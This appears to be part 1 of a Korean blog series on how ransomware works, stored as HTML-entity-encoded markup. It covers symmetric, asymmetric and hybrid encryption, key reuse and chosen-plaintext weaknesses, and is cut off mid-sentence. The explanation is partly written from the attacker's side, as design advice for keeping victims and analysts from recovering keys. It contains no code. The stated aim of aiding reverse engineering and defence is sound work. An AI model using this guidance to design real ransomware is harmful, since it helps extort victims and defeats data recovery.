&#xC774;&#xD574;&#xD558;&#xB294; &#xAC83;&#xC774; &#xC911;&#xC694;&#xD558;&#xB2E4;. &#xC774; &#xAC8C;&#xC2DC;&#xAE00;&#xC774; &#xB79C;&#xC12C;&#xC6E8;&#xC5B4;&#xC758; &#xC554;&#xD638; &#xBA54;&#xCEE4;&#xB2C8;&#xC998;&#xC744; &#xB9AC;&#xBC84;&#xC2F1;&#xD558;&#xAC70;&#xB098; &#xAC10;&#xC5FC;&#xC744; &#xB9C9;&#xB294;&#xB370; &#xB3C4;&#xC6C0;&#xC774; &#xB418;&#xAE38; &#xBC14;&#xB780;&#xB2E4;. </p><p>&#xC5B4;&#xB5A4; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xB3D9;&#xC791;&#xD558;&#xB294;&#xC9C0; &#xD30C;&#xC545;&#xD558;&#xB294;&#xB370; &#xAC00;&#xC7A5; &#xC88B;&#xC740; &#xBC29;&#xBC95;&#xC740; &#xC9C1;&#xC811; &#xB9CC;&#xB4E4;&#xC5B4;&#xBCF4;&#xB294; &#xAC83;&#xC774;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xD30C;&#xD2B8; 1&#xC5D0;&#xC11C;&#xB294; &#xC6D0;&#xB9AC;&#xC640; &#xAC1C;&#xB150;&#xC5D0; &#xB300;&#xD574; &#xC124;&#xBA85;&#xD558;&#xACE0; &#xD30C;&#xD2B8; 2&#xC5D0;&#xC11C;&#xB294; &#xC6D0;&#xB9AC;&#xB97C; &#xC801;&#xC6A9;&#xC2DC;&#xCF1C; &#xB79C;&#xC12C;&#xC6E8;&#xC5B4;&#xB97C; &#xB9CC;&#xB4E4;&#xC5B4; &#xBCFC; &#xAC83;&#xC774;&#xB2E4;.</p><h1 id="&#xAE30;&#xBCF8;-&#xC6D0;&#xB9AC;"><a href="#&#xAE30;&#xBCF8;-&#xC6D0;&#xB9AC;" class="headerlink" title="&#xAE30;&#xBCF8; &#xC6D0;&#xB9AC;"></a>&#xAE30;&#xBCF8; &#xC6D0;&#xB9AC;</h1><p>&#xB79C;&#xC12C;&#xC6E8;&#xC5B4;&#xC5D0;&#xC11C; &#xAC00;&#xC7A5; &#xC911;&#xC694;&#xD55C; &#xAC1C;&#xB150;&#xC740; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xC554;&#xD638;&#xD654; &#xC720;&#xD615;&#xC774;&#xB2E4;. &#xC8FC;&#xB85C; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xB450; &#xAC00;&#xC9C0;&#xAC00; &#xC788;&#xACE0; &#xAD1C;&#xCC2E;&#xC740; &#xB79C;&#xC12C;&#xC6E8;&#xC5B4;&#xB4E4;&#xC5D0;&#xC11C;&#xB3C4; &#xC0AC;&#xC6A9;&#xB41C;&#xB2E4;. &#xAC04;&#xB2E8;&#xD558;&#xAC8C; &#xC124;&#xBA85;&#xD558;&#xACE0; &#xC2A4;&#xC2A4;&#xB85C; &#xACF5;&#xBD80;&#xD560; &#xC218; &#xC788;&#xB294; reference&#xB97C; &#xC81C;&#xACF5;&#xD560; &#xAC83;&#xC774;&#xB2E4;.</p><h2 id="&#xB300;&#xCE6D;&#xD0A4;-&#xC554;&#xD638;&#xD654;"><a href="#&#xB300;&#xCE6D;&#xD0A4;-&#xC554;&#xD638;&#xD654;" class="headerlink" title="&#xB300;&#xCE6D;&#xD0A4; &#xC554;&#xD638;&#xD654;"></a>&#xB300;&#xCE6D;&#xD0A4; &#xC554;&#xD638;&#xD654;</h2><p><img src="/2021/04/11/idioth/arch_of_ransomware_part1/Untitled.png" alt></p><p>&#xB300;&#xCE6D;&#xD0A4; &#xC554;&#xD638;&#xD654;&#xB294; &#xB300;&#xBD80;&#xBD84; &#xC0AC;&#xB78C;&#xB4E4;&#xC5D0;&#xAC8C; &#xC775;&#xC219;&#xD558;&#xB2E4;. &#xD55C; &#xAC1C;&#xC758; &#xD0A4;&#xB97C; &#xAC00;&#xC9C0;&#xACE0; &#xB370;&#xC774;&#xD130; &#xC554;&#xD638;&#xD654;, &#xBCF5;&#xD638;&#xD654;&#xC5D0; &#xBAA8;&#xB450; &#xC0AC;&#xC6A9;&#xD55C;&#xB2E4;. zip &#xD30C;&#xC77C;&#xC640; office &#xBB38;&#xC11C; &#xB4F1;&#xC5D0; &#xC0AC;&#xC6A9;&#xB418;&#xBA70; &#xC554;&#xD638;&#xD654;&#xD560; &#xB54C; &#xC0AC;&#xC6A9;&#xD55C; password&#xC640; &#xBCF5;&#xD638;&#xD654;&#xC5D0; &#xC0AC;&#xC6A9;&#xD558;&#xB294; password&#xAC00; &#xAC19;&#xB2E4;.</p><h2 id="&#xBE44;&#xB300;&#xCE6D;&#xD0A4;-&#xC554;&#xD638;&#xD654;"><a href="#&#xBE44;&#xB300;&#xCE6D;&#xD0A4;-&#xC554;&#xD638;&#xD654;" class="headerlink" title="&#xBE44;&#xB300;&#xCE6D;&#xD0A4; &#xC554;&#xD638;&#xD654;"></a>&#xBE44;&#xB300;&#xCE6D;&#xD0A4; &#xC554;&#xD638;&#xD654;</h2><p><img src="/2021/04/11/idioth/arch_of_ransomware_part1/Untitled%201.png" alt></p><p>&#xBE44;&#xB300;&#xCE6D;&#xD0A4; &#xC554;&#xD638;&#xD654;&#xB294; &#xB300;&#xBD80;&#xBD84; &#xC0AC;&#xB78C;&#xB4E4;&#xC774; &#xD63C;&#xB780;&#xC2A4;&#xB7EC;&#xC6CC;&#xD558;&#xB294; &#xAC1C;&#xB150;&#xC774;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; &#xD2B9;&#xC815; &#xAD6C;&#xD604;&#xC744; &#xC0DD;&#xAC01;&#xD558;&#xC9C0; &#xC54A;&#xC73C;&#xBA74; &#xC774;&#xD574;&#xD558;&#xAE30; &#xC27D;&#xB2E4;.</p><p>&#xC77C;&#xBC18;&#xC801;&#xC73C;&#xB85C; &#xBE44;&#xB300;&#xCE6D;&#xD0A4; &#xC554;&#xD638;&#xD654;&#xB294; &#xB450; &#xAC1C;&#xC758; &#xD0A4;&#xB97C; &#xC0AC;&#xC6A9;&#xD55C;&#xB2E4;. &#xBAA8;&#xB4E0; &#xD0A4;&#xB97C; &#xC0AC;&#xC6A9;&#xD574;&#xC11C; &#xD30C;&#xC77C;&#xC744; &#xC554;&#xD638;&#xD654;&#xD560; &#xC218; &#xC788;&#xC9C0;&#xB9CC; &#xB2E4;&#xB978; &#xD0A4;&#xB97C; &#xC0AC;&#xC6A9;&#xD574;&#xC11C; &#xBCF5;&#xD638;&#xD654;&#xB97C; &#xD574;&#xC57C; &#xD55C;&#xB2E4;.</p><p>secret key&#xC640; public key&#xC5D0; &#xB300;&#xD574;&#xC11C; &#xB4E4;&#xC5B4;&#xBD24;&#xC744; &#xAC83;&#xC774;&#xB2E4;. &#xC774;&#xAC83;&#xB4E4;&#xC740; &#xC774;&#xB984;&#xCC98;&#xB7FC; &#xB2E8;&#xC21C;&#xD558;&#xAC8C; public &#xD558;&#xAC70;&#xB098; secret &#xD558;&#xAC8C; &#xBCF4;&#xAD00;&#xB418;&#xB294; &#xD0A4;&#xC774;&#xB2E4;. &#xB204;&#xAD6C;&#xB098; public key&#xC5D0; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xACE0; &#xC554;&#xD638;&#xD654;&#xC5D0; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xC9C0;&#xB9CC; &#xBCF5;&#xD638;&#xD654;&#xC5D0; secret key&#xAC00; &#xD544;&#xC694;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xD574;&#xB2F9; &#xD0A4;&#xC758; &#xC18C;&#xC720;&#xC790;&#xB9CC;&#xC774; &#xBCF5;&#xD638;&#xD654;&#xD560; &#xC218; &#xC788;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; secret key&#xB97C; &#xC0AC;&#xC6A9;&#xD574; &#xBAA8;&#xB4E0; &#xC815;&#xBCF4;&#xB97C; &#xC554;&#xD638;&#xD654;&#xD560; &#xC218; &#xC788;&#xC73C;&#xBA70; &#xD574;&#xB2F9; &#xD0A4; &#xC18C;&#xC720;&#xC790;&#xC758; public key&#xB97C; &#xD1B5;&#xD574; &#xB204;&#xAD6C;&#xB098; &#xC77D;&#xC744; &#xC218; &#xC788;&#xB2E4;. &#xC774;&#xB7EC;&#xD55C; &#xD589;&#xC704;&#xB97C; signing&#xC774;&#xB77C; &#xBD80;&#xB974;&#xBA70; &#xBE44;&#xBC00; &#xBAA9;&#xC801;&#xC774; &#xC544;&#xB2C8;&#xB77C; &#xD574;&#xB2F9; &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xBCF4;&#xB0B8; &#xC0AC;&#xB78C;&#xC744; &#xC99D;&#xBA85;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C; &#xC0AC;&#xC6A9;&#xB41C;&#xB2E4;.</p><h1 id="&#xB79C;&#xC12C;&#xC6E8;&#xC5B4;-&#xAD00;&#xB828;-&#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;"><a href="#&#xB79C;&#xC12C;&#xC6E8;&#xC5B4;-&#xAD00;&#xB828;-&#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;" class="headerlink" title="&#xB79C;&#xC12C;&#xC6E8;&#xC5B4; &#xAD00;&#xB828; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;"></a>&#xB79C;&#xC12C;&#xC6E8;&#xC5B4; &#xAD00;&#xB828; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;</h1><p>regular infection&#xC758; &#xD750;&#xB984;&#xC744; &#xC0DD;&#xAC01;&#xD574;&#xBCF4;&#xC790;. &#xB79C;&#xC12C;&#xC6E8;&#xC5B4; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xB294; &#xC5EC;&#xB7EC; &#xAC00;&#xC9C0; &#xBCA1;&#xD130;(&#xD53C;&#xC2F1;, &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4; &#xCDE8;&#xC57D;&#xC810; &#xB4F1;) &#xC911; &#xD558;&#xB098;&#xC5D0; &#xC758;&#xD574; &#xC804;&#xB2EC;&#xB418;&#xACE0; &#xC2E4;&#xD589;&#xB418;&#xC5B4; &#xBAA8;&#xB4E0; &#xD30C;&#xC77C;&#xC774; &#xC554;&#xD638;&#xD654;&#xB41C;&#xB2E4;. &#xADF8; &#xD6C4; &#xD30C;&#xC77C;&#xC744; &#xBCF5;&#xD638;&#xD654;&#xD558;&#xAE30; &#xC704;&#xD574; &#xBB34;&#xC5B8;&#xAC00;&#xB97C; &#xC9C0;&#xBD88;&#xD558;&#xB77C;&#xB294; &#xCC3D;&#xC774; &#xB72C;&#xB2E4;. &#xC774;&#xB97C; &#xC5B4;&#xB5BB;&#xAC8C; &#xC218;&#xD589;&#xD560; &#xC218; &#xC788;&#xC744;&#xAE4C;?</p><p>&#xCCAB; &#xBC88;&#xC9F8;&#xB294; &#xB300;&#xCE6D;&#xD0A4; &#xC554;&#xD638;&#xD654;&#xB97C; &#xD1B5;&#xD574; &#xD30C;&#xC77C;&#xC744; &#xC554;&#xD638;&#xD654;&#xD558;&#xB294; &#xAC83;&#xC774;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; &#xC774;&#xB294; &#xC88B;&#xC740; &#xBC29;&#xBC95;&#xC774; &#xC544;&#xB2C8;&#xB2E4;. &#xAD1C;&#xCC2E;&#xC740; &#xB79C;&#xC12C;&#xC6E8;&#xC5B4;&#xB4E4;&#xC740; &#xD55C; &#xAC00;&#xC9C0; &#xC911;&#xC694;&#xD55C; &#xC774;&#xC720;&#xB85C; &#xC774; &#xBC29;&#xBC95;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC9C0; &#xC54A;&#xB294;&#xB2E4;. &#xB79C;&#xC12C;&#xC6E8;&#xC5B4;&#xAC00; &#xD30C;&#xC77C;&#xC744; &#xC554;&#xD638;&#xD654;&#xD560; &#xB54C;, &#xC5B4;&#xB518;&#xAC00;&#xC5D0; &#xC554;&#xD638;&#xD654; &#xD0A4;&#xAC00; &#xC874;&#xC7AC;&#xD560; &#xAC83;&#xC774;&#xB2E4;. &#xB300;&#xCE6D;&#xD0A4; &#xC554;&#xD638;&#xD654;&#xB97C; &#xC0AC;&#xC6A9;&#xD55C;&#xB2E4;&#xBA74; &#xC554;&#xD638;&#xD654;&#xC5D0; &#xC0AC;&#xC6A9;&#xB41C; &#xD0A4;&#xAC00; &#xBCF5;&#xD638;&#xD654;&#xC5D0; &#xC0AC;&#xC6A9;&#xB420; &#xC218; &#xC788;&#xB2E4;. &#xD3EC;&#xB80C;&#xC2DD; &#xBD84;&#xC11D;&#xAC00;&#xAC00; &#xC554;&#xD638;&#xD654;&#xC5D0; &#xC0AC;&#xC6A9;&#xB41C; &#xD0A4;&#xB97C; &#xBCF5;&#xAD6C;&#xD558;&#xC5EC; &#xD30C;&#xC77C;&#xC744; &#xBCF5;&#xD638;&#xD654;&#xD560; &#xC218; &#xC788;&#xB2E4;. &#xBE44;&#xB300;&#xCE6D; key&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xBA74; &#xC554;&#xD638;&#xD654;&#xC640; &#xBCF5;&#xD638;&#xD654;&#xC5D0; &#xB2E4;&#xB978; &#xD0A4;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xBBC0;&#xB85C; &#xBCF5;&#xD638;&#xD654; &#xD0A4;&#xB9CC; &#xC798; &#xBCF4;&#xD638;&#xD558;&#xBA74; victim&#xC758; &#xCEF4;&#xD4E8;&#xD130;&#xC5D0; &#xC554;&#xD638;&#xD654; &#xD0A4;&#xAC00; &#xC788;&#xB294; &#xAC83;&#xC740; &#xD070; &#xBB38;&#xC81C;&#xAC00; &#xB418;&#xC9C0; &#xC54A;&#xB294;&#xB2E4;.</p><p>&#xD574;&#xCEE4;&#xB85C;&#xC11C; &#xACE0;&#xBBFC;&#xD574;&#xC57C; &#xD560; &#xB2E4;&#xB978; &#xC911;&#xC694;&#xD55C; &#xC810;&#xC740; victim&#xC774; &#xC9C0;&#xBD88;&#xD588;&#xC744; &#xACBD;&#xC6B0;&#xB97C; &#xC704;&#xD55C; &#xD0A4;&#xAC00; &#xD544;&#xC694;&#xD55C; &#xAC83;&#xC774;&#xB2E4;. &#xB300;&#xCE6D;&#xD0A4; &#xC554;&#xD638;&#xD654;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xBA74; &#xBC14;&#xC774;&#xB108;&#xB9AC; &#xCF54;&#xB4DC;&#xC5D0; &#xD0A4;&#xB97C; &#xD558;&#xB4DC;&#xCF54;&#xB529;(&#xB9AC;&#xBC84;&#xC2F1;&#xD560; &#xC218; &#xC788;&#xC73C;&#xBBC0;&#xB85C; &#xC548; &#xC88B;&#xC740; &#xBC29;&#xBC95;&#xC774;&#xB2E4;)&#xD558;&#xAC70;&#xB098; &#xD0A4;&#xB97C; &#xC0DD;&#xC131;&#xD574;&#xC11C; &#xC6B0;&#xB9AC;&#xC758; &#xC11C;&#xBC84;&#xC5D0; &#xC804;&#xC1A1;&#xD560; &#xBC29;&#xBC95;(intercept &#xB2F9;&#xD560; &#xC218; &#xC788;&#xACE0; &#xC5F0;&#xACB0;&#xC774; &#xB04A;&#xC5B4;&#xC9C0;&#xBA74; &#xD0A4;&#xAC00; &#xC5C6;&#xC5B4;&#xC11C; &#xD0A4;&#xB97C; &#xC904; &#xC218; &#xC5C6;&#xB2E4;)&#xC744; &#xCC3E;&#xC544;&#xC57C; &#xD55C;&#xB2E4;. <a href="https://www.computerworld.com/article/2489311/cryptodefense-ransomware-leaves-decryption-key-accessible.html">&#xC774;&#xB7F0; &#xD615;&#xD0DC;&#xC758; &#xCCAB; &#xBC88;&#xC9F8; &#xB79C;&#xC12C;&#xC6E8;&#xC5B4;&#xB294; CryptoDefense&#xC758; &#xBCC0;&#xC885;</a>&#xC73C;&#xB85C; &#xC0DD;&#xC131;&#xB41C; &#xD0A4;&#xB97C; &#xC11C;&#xBC84;&#xB85C; &#xC804;&#xC1A1;&#xD55C; &#xD6C4; victim&#xC758; &#xB85C;&#xCEEC;&#xC5D0; &#xD30C;&#xC77C;&#xC744; &#xB0A8;&#xAE30;&#xB294; &#xBC14;&#xB78C;&#xC5D0; &#xBCF5;&#xD638;&#xD654;&#xAC00; &#xAC00;&#xB2A5;&#xD588;&#xB2E4;.</p><p>&#xC774;&#xB7EC;&#xD55C; &#xC810;&#xC740; &#xD30C;&#xC77C;&#xC744; &#xC554;&#xD638;&#xD654;&#xD560; &#xB54C; &#xBE44;&#xB300;&#xCE6D;&#xD0A4; &#xC554;&#xD638;&#xD654;&#xB97C; &#xC0AC;&#xC6A9;&#xD574;&#xC57C; &#xD55C;&#xB2E4;&#xB294; &#xAC78; &#xC54C;&#xB824;&#xC900;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; key pair&#xB97C; &#xC0DD;&#xC131;&#xD55C; &#xD6C4; public key&#xB97C; &#xCF54;&#xB4DC;&#xC5D0; &#xD558;&#xB4DC; &#xCF54;&#xB529;&#xD558;&#xC5EC; &#xBAA8;&#xB4E0; &#xD30C;&#xC77C;&#xC744; &#xC554;&#xD638;&#xD654;&#xD558;&#xB294; &#xAC83;&#xC740; &#xBD88;&#xAC00;&#xB2A5;&#xD558;&#xB2E4;.</p><p>&#xBE44;&#xB300;&#xCE6D;&#xD0A4; &#xC554;&#xD638;&#xD654;&#xB294; &#xB300;&#xCE6D;&#xD0A4; &#xC554;&#xD638;&#xD654;&#xC5D0; &#xBE44;&#xD574;&#xC11C; &#xB290;&#xB9AC;&#xB2E4;. &#xD30C;&#xC77C;&#xC744; &#xC554;&#xD638;&#xD654;&#xB294; &#xAC83;&#xC774; &#xC624;&#xB798; &#xAC78;&#xB9AC;&#xBA74; victim&#xC774; &#xC54C;&#xC544;&#xCC28;&#xB9AC;&#xACE0; &#xCEF4;&#xD4E8;&#xD130;&#xB97C; &#xAEBC;&#xC11C; &#xC554;&#xD638;&#xD654;&#xAC00; &#xC2E4;&#xD328;&#xD560; &#xC218; &#xC788;&#xB2E4;. &#xADF8;&#xB7EC;&#xBA74; &#xC5B4;&#xB5BB;&#xAC8C; &#xD574;&#xC57C; &#xD560;&#xAE4C;?</p><h2 id="&#xD558;&#xC774;&#xBE0C;&#xB9AC;&#xB4DC;-&#xC811;&#xADFC;&#xBC95;"><a href="#&#xD558;&#xC774;&#xBE0C;&#xB9AC;&#xB4DC;-&#xC811;&#xADFC;&#xBC95;" class="headerlink" title="&#xD558;&#xC774;&#xBE0C;&#xB9AC;&#xB4DC; &#xC811;&#xADFC;&#xBC95;"></a>&#xD558;&#xC774;&#xBE0C;&#xB9AC;&#xB4DC; &#xC811;&#xADFC;&#xBC95;</h2><p>&#xC774; &#xBB38;&#xC81C;&#xB97C; &#xD574;&#xACB0;&#xD558;&#xAE30; &#xC704;&#xD574; &#xD558;&#xC774;&#xBE0C;&#xB9AC;&#xB4DC; &#xC811;&#xADFC;&#xBC95;&#xC744; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xB2E4;. &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xB97C; &#xC0DD;&#xC131;&#xD560; &#xB54C; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xC640; &#xAD00;&#xB828;&#xB41C; public/private key&#xB3C4; &#xC0DD;&#xC131;&#xD55C;&#xB2E4;. &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xC5D0; public key&#xB97C; &#xD558;&#xB4DC; &#xCF54;&#xB529;&#xD558;&#xACE0; infection&#xC774; &#xBC1C;&#xC0DD;&#xD560; &#xB54C;&#xB9C8;&#xB2E4; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xB294; &#xB300;&#xCE6D; &#xC554;&#xD638;&#xD654;&#xC5D0; &#xC0AC;&#xC6A9;&#xB420; &#xD0A4;&#xB97C; &#xC0DD;&#xC131;&#xD55C;&#xB2E4;. &#xC554;&#xD638;&#xD654;&#xAC00; &#xB418;&#xBA74; &#xD558;&#xB4DC; &#xCF54;&#xB529;&#xB41C; public key&#xB85C; &#xB300;&#xCE6D; &#xD0A4;&#xB97C; &#xC554;&#xD638;&#xD654;&#xD55C;&#xB2E4;(&#xBB3C;&#xB860; &#xBA54;&#xBAA8;&#xB9AC;/&#xB514;&#xC2A4;&#xD06C;&#xC758; &#xD3C9;&#xBB38; &#xB300;&#xCE6D;&#xD0A4;&#xB294; &#xC5C6;&#xC564;&#xB2E4;). &#xC554;&#xD638;&#xD654;&#xB41C; &#xB300;&#xCE6D; &#xD0A4;&#xB294; &#xC5B4;&#xB518;&#xAC00;&#xC5D0; &#xC800;&#xC7A5;&#xB41C;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; &#xB2E4;&#xB978; &#xBB38;&#xC81C;&#xAC00; &#xC874;&#xC7AC;&#xD55C;&#xB2E4;.</p><h3 id="Key-re-utilization-chosen-plaintext-attack"><a href="#Key-re-utilization-chosen-plaintext-attack" class="headerlink" title="Key re utilization / chosen plaintext attack"></a>Key re utilization / chosen plaintext attack</h3><p><a href="https://simple.wikipedia.org/wiki/Chosen-plaintext_attack">Chosen plaintext attack</a>&#xC740; &#xC554;&#xD638;&#xD654; &#xC804; &#xD3C9;&#xBB38;&#xC744; &#xC54C;&#xACE0; &#xC788;&#xACE0; &#xC554;&#xD638;&#xD654;&#xB41C; &#xC0D8;&#xD50C;&#xC774; &#xB9CE;&#xC744; &#xACBD;&#xC6B0; &#xC554;&#xD638;&#xD654;&#xB41C; &#xACB0;&#xACFC;&#xC5D0;&#xC11C; &#xD0A4;&#xB97C; &#xC720;&#xCD94;&#xD560; &#xC218; &#xC788;&#xB294; &#xC554;&#xD638;&#xD654; &#xACF5;&#xACA9;&#xC774;&#xB2E4;. &#xC798; &#xC54C;&#xB824;&#xC9C4; &#xD3EC;&#xB9F7;&#xC744; &#xAC00;&#xC9C4; &#xB300;&#xBD80;&#xBD84; &#xD30C;&#xC77C;&#xC758; &#xD5E4;&#xB354;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD560; &#xC218; &#xC788;&#xB2E4;. &#xBAA8;&#xB4E0; &#xD30C;&#xC77C;&#xC5D0; &#xAC19;&#xC740; &#xD0A4;&#xB97C; &#xC0AC;&#xC6A9;&#xD55C;&#xB2E4;&#xBA74; &#xD2B9;&#xC815; &#xC870;&#xAC74;&#xC5D0;&#xC11C; &#xBCF5;&#xD638;&#xD654;&#xB420; &#xC218; &#xC788;&#xB2E4;. <a href="https://blog.checkpoint.com/2014/08/27/hacking-the-hacker/">&#xC774; &#xBB38;&#xC81C;&#xB294; &#xC2E4;&#xC81C;&#xB85C; DirCrypt&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD588;&#xB2E4;</a>. &#xC798;&#xBABB;&#xB41C; &#xC554;&#xD638;&#xD654; &#xAD6C;&#xD604;&#xACFC; key &#xC7AC;&#xC0AC;&#xC6A9;&#xC73C;&#xB85C; &#xC778;&#xD574; &#xC554;&#xD638;&#xD654;&#xAC00; &#xB9AC;&#xBC84;&#xC2F1; &#xB418;&#xC5C8;&#xB2E4;.</p><p>&#xC774; &#xC774;&#xC288;&#xB294; &#xAC01; &#xD30C;&#xC77C;&#xC5D0; &#xB2E4;&#xB978; &#xD0A4;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xD574;&#xACB0;&#xD560; &#xC218; &#xC788;&#xB2E4;. &#xD30C;&#xC77C;&#xB9C8;&#xB2E4; &#xB300;&#xCE6D;&#xD0A4;&#xB97C; &#xC0DD;&#xC131;&#xD574;&#xC11C; &#xC554;&#xD638;&#xD654;&#xD558;&#xACE0; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xC5D0; &#xC788;&#xB294; public key&#xB85C; &#xD0A4;&#xB97C; &#xC554;&#xD638;&#xD654;&#xD55C; &#xD6C4; &#xC554;&#xD638;&#xD654;&#xB41C; &#xB300;&#xCE6D; &#xD0A4;&#xB97C; &#xC800;&#xC7A5;&#xD558;&#xACE0; &#xD3C9;&#xBB38;&#xC73C;&#xB85C; &#xB41C; &#xB300;&#xCE6D; &#xD0A4;&#xB97C; &#xC0AD;&#xC81C;&#xD560; &#xC218; &#xC788;&#xB2E4;.</p><p>&#xB9CE;&#xC740; &#xB79C;&#xC12C;&#xC6E8;&#xC5B4;&#xB4E4;&#xC740; &#xC774; &#xBC29;&#xBC95;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xC554;&#xD638;&#xD654;&#xB41C; &#xD30C;&#xC77C; &#xC774;&#xB984; + &#xC554;&#xD638;&#xD654;&#xB41C; public key&#xAC00; &#xC801;&#xD78C; &#xD14D;&#xC2A4;&#xD2B8; &#xD30C;&#xC77C;&#xC744; &#xC0DD;&#xC131;&#xD55C;&#xB2E4;. &#xBCF5;&#xD638;&#xD654; &#xD234;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xBA74; &#xC774; &#xD14D;&#xC2A4;&#xD2B8; &#xD30C;&#xC77C;&#xC744; &#xC77D;&#xC5B4;&#xC11C; private key&#xB85C; &#xAC01; &#xD0A4;&#xB97C; &#xBCF5;&#xD638;&#xD654;&#xD55C; &#xD6C4; &#xD30C;&#xC77C;&#xC744; &#xBCF5;&#xD638;&#xD654;&#xD55C;&#xB2E4;. &#xC6B0;&#xB9AC;&#xB294; &#xB2E4;&#xB978; &#xAC83;&#xC744; &#xC0AC;&#xC6A9;&#xD560; &#xAC83;&#xC774;&#xB2E4;.</p><blockquote><p>Technical note: &#xC774;&#xB7EC;&#xD55C; &#xC720;&#xD615;&#xC758; &#xACF5;&#xACA9;&#xC740; &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; &#xAC01; &#xD30C;&#xC77C; &#xC2A4;&#xD2B8;&#xB9BC;&#xC5D0; &#xB2E4;&#xB978; randomized initialization vector(IV)&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xBBC0;&#xB85C; &#xC6B0;&#xB9AC;&#xAC00; &#xC0AC;&#xC6A9;&#xD560; AES-256&#xC5D0;&#xB294; &#xC601;&#xD5A5;&#xC744; &#xBC1B;&#xC9C0; &#xC54A;&#xC9C0;&#xB9CC;, &#xBAA8;&#xB4E0; &#xB79C;&#xC12C;&#xC6E8;&#xC5B4;&#xC5D0; &#xB300;&#xD55C; &#xC77C;&#xBC18;&#xC801;&#xC778; &#xAC1C;&#xB150;&#xC744; &#xC124;&#xBA85;&#xD558;&#xACE0; &#xC2F6;&#xC5C8;&#xB2E4;. &#xC545;&#xC131;&#xCF54;&#xB4DC; &#xAC1C;&#xBC1C;&#xC790;&#xAC00; &#xC2E4;&#xC218;&#xD558;&#xBA74; &#xB370;&#xC774;&#xD130;&#xB97C; &#xBCF5;&#xAD6C;&#xD558;&#xB294;&#xB370; &#xB3C4;&#xC6C0;&#xC774; &#xB418;&#xC5C8;&#xC73C;&#xBA74; &#xD55C;&#xB2E4;.</p></blockquote><p><a href="https://stackoverflow.com/questions/7932061/is-the-result-of-a-rsa-encryption-guaranteed-to-be-random/7933071#7933071">&#xC774; &#xACF5;&#xACA9;&#xC740; &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; randomize &#xB418;&#xC9C0; &#xC54A;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; RSA &#xC554;&#xD638;&#xD654;&#xC5D0; &#xC601;&#xD5A5;&#xC744; &#xC904; &#xC218; &#xC788;&#xB2E4;</a>. &#xB2E4;&#xC74C;&#xC758; &#xC774;&#xC720; &#xB54C;&#xBB38;&#xC5D0; &#xC6B0;&#xB9AC;&#xC5D0; &#xB300;&#xD574;&#xC11C;&#xB294; &#xBB38;&#xC81C;&#xAC00; &#xB418;&#xC9C0; &#xC54A;&#xC744; &#xAC83;&#xC774;&#xB2E4;:<br>a) RSA&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xC554;&#xD638;&#xD654;&#xD560; &#xAC83;&#xC740; AES &#xC554;&#xD638;&#xD654; &#xD0A4;&#xBFD0;&#xC774;&#xBA70; &#xBD84;&#xC11D;&#xD560; &#xC0D8;&#xD50C;&#xC744; &#xAD6C;&#xC131;&#xD558;&#xC9C0; &#xC54A;&#xB294;&#xB2E4;.<br>b) &#xC554;&#xD638;&#xD654;&#xC5D0; randomziation&#xC744; &#xCD94;&#xAC00;&#xD558;&#xB294; <a href="https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding">Optimal asymmetric encryption padding</a>&#xACFC; &#xACB0;&#xD569;&#xB41C; RSA&#xB97C; &#xC0AC;&#xC6A9;&#xD560; &#xAC83;&#xC774;&#xB2E4;.</p><p>&#xD30C;&#xC77C;&#xB9C8;&#xB2E4; &#xB2E4;&#xB978; &#xD0A4;&#xB97C; &#xC0AC;&#xC6A9;&#xD574;&#xC11C; &#xC624;&#xB294; &#xB2E4;&#xB978; &#xC774;&#xB4DD;&#xC740; &#xAC01; &#xD30C;&#xC77C;&#xC744; &#xC554;&#xD638;&#xD654;&#xD55C; &#xD6C4; &#xC554;&#xD638;&#xD654; &#xD0A4;&#xB97C; &#xC0AD;&#xC81C;&#xD560; &#xC218; &#xC788;&#xB294; &#xAC83;&#xC774;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xBD84;&#xC11D;&#xAC00;&#xAC00; &#xD0A4;&#xB97C; &#xBCF5;&#xAD6C;&#xD558;&#xB824;&#xACE0; &#xD558;&#xBA74; &#xB9C8;&#xC9C0;&#xB9C9; &#xD30C;&#xC77C;&#xC5D0; 